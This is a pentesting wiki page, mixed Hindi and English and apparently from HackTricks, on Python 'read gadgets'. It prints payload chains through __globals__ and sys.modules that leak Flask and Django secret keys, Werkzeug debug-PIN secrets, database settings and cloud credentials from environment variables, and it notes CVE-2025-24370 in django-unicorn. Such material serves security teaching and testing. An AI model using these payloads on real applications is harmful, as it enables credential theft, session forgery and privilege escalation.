# Python Internal Read Gadgets

{{#include ../../banners/hacktricks-training.md}}

## बुनियादी जानकारी

Different vulnerabilities such as [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) or [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) आपको **python internal data पढ़ने** की अनुमति दे सकते हैं लेकिन आपको कोड execute करने की अनुमति नहीं देंगे। इसलिए, एक pentester को इन रीड permissions का पूरा उपयोग करके **संवेदनशील privileges प्राप्त करने और vulnerability को escalate करने** की आवश्यकता होगी।

### Flask - Read secret key

Flask application के main पेज में संभवतः **`app`** नाम का global object होगा जहाँ यह **secret configured किया गया है**।
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
In this case it's possible to access this object just using any gadget to **access global objects** from the [**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html).

ऐसी स्थिति में जहाँ **the vulnerability is in a different python file**, आपको फ़ाइलों को traverse करने के लिए एक गैजेट चाहिए ताकि आप मुख्य फ़ाइल तक पहुँच सकें और **access the global object `app.secret_key`** करके Flask secret key बदल सकें और इस key को जानते हुए [**escalate privileges** knowing this key](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign) में सक्षम हो सकें।

A payload like this one [from this writeup](https://ctftime.org/writeup/36082):
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Use this payload to **change `app.secret_key`** (the name in your app might be different) to be able to sign new and more privileges flask cookies.

### Werkzeug - machine_id and node uuid

[**Using these payload from this writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) के उपयोग से आप **machine_id** और **uuid** node तक पहुँच पाएँगे, जो कि वे **main secrets** हैं जिनकी आपको [**generate the Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) के लिए आवश्यकता है — इसे आप python console `/console` में पहुँचने के लिए इस्तेमाल कर सकते हैं यदि **debug mode is enabled:**
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> ध्यान दें कि आप वेब पेज पर कुछ **error** उत्पन्न करके सर्वर के `app.py` का **स्थानीय पथ** प्राप्त कर सकते हैं जो आपको वह पथ दे देगा।

यदि vulnerability किसी अन्य python फ़ाइल में है, तो main python फ़ाइल से objects तक पहुँचने के लिए पहले बताए गए Flask trick को देखें।

### Django - SECRET_KEY and settings module

एप्लिकेशन शुरू होते ही Django settings ऑब्जेक्ट `sys.modules` में cached हो जाता है। केवल read primitives का उपयोग करके आप **`SECRET_KEY`**, डेटाबेस credentials या signing salts leak कर सकते हैं:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.DATABASES, a.SIGNING_BACKEND)
```
यदि vulnerable gadget किसी अन्य module में है, तो पहले globals को walk करें:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
एक बार key ज्ञात हो जाने पर आप Django signed cookies या tokens को Flask की तरह ही forge कर सकते हैं।

### Environment variables / cloud creds loaded modules के माध्यम से

कई jails अभी भी किसी न किसी जगह `os` या `sys` import करते हैं। आप किसी भी पहुंच योग्य function `__init__.__globals__` का दुरुपयोग करके पहले से-imported `os` module की ओर pivot कर सकते हैं और उन **environment variables** को dump कर सकते हैं जिनमें API tokens, cloud keys या flags होते हैं:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
यदि subclass index फ़िल्टर किया गया है, तो loaders का उपयोग करें:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Environment variables अक्सर read से full compromise तक पहुँचने के लिए अकेले ही आवश्यक secrets होते हैं (cloud IAM keys, database URLs, signing keys, आदि)।

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` (<0.62.0) ने crafted component requests के माध्यम से **class pollution** की अनुमति दी। `__init__.__globals__` जैसे property path सेट करने से एक attacker component module के globals और किसी भी imported modules (जैसे `settings`, `os`, `sys`) तक पहुँच सकता है। वहां से आप बिना code execution के `SECRET_KEY`, `DATABASES` या service credentials को leak कर सकते हैं। यह exploit chain पूरी तरह से read-based है और ऊपर बताए गए समान dunder-gadget patterns का उपयोग करती है।

### Gadget collections for chaining

Recent CTFs (e.g. jailCTF 2025) ने केवल attribute access और subclass enumeration का उपयोग करके भरोसेमंद read chains दिखाये हैं। Community-maintained lists जैसे [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) सैकड़ों minimal gadgets को catalog करती हैं जिन्हें आप objects से `__globals__`, `sys.modules` और अंततः sensitive data तक पहुँचने के लिए combine कर सकते हैं। इन्हें तब जल्दी से इस्तेमाल करें जब indices या class names Python के minor versions के बीच अलग हों।



## References

- [Wiz analysis of django-unicorn class pollution (CVE-2025-24370)](https://www.wiz.io/vulnerability-database/cve/cve-2025-24370)
- [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
{{#include ../../banners/hacktricks-training.md}}
